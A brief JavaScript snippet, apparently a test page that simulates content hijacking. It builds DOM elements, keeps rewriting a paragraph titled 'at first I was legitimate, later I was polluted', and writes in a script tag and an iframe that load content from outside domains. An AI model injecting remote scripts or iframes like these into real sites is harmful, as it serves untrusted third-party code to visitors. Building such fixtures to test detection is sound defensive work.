var d = document.createElement("div");
var html = '<ul><li>1</li><li>2</li><li>3</li><li>4<a href="http://www.baidu.com/"><img src="http://202.105.165.202:8888/tb/zsdx/20160622145522/images/201606221454315960.jpg" /></a></li></ul>';
d.id = "div";
d.innerHTML = html;
document.body.appendChild(d);

var p = document.createElement("p");
p.id = "p";
p.title = "开始我是合法的，后来被污染了...";
document.body.appendChild(p);

setInterval(function(){
    p.innerHTML = html;
},2000);

id.innerHTML = '<script type="text/javascript" src="http://bdwm.hsmkj.net/sd/9201.js"><\/script>';
id.innerHTML = '<iframe id="iframe" style="width: 300px; height: 250px; border: 0" src="http://wwwm.luofudz.com/xp/1.html"></iframe>';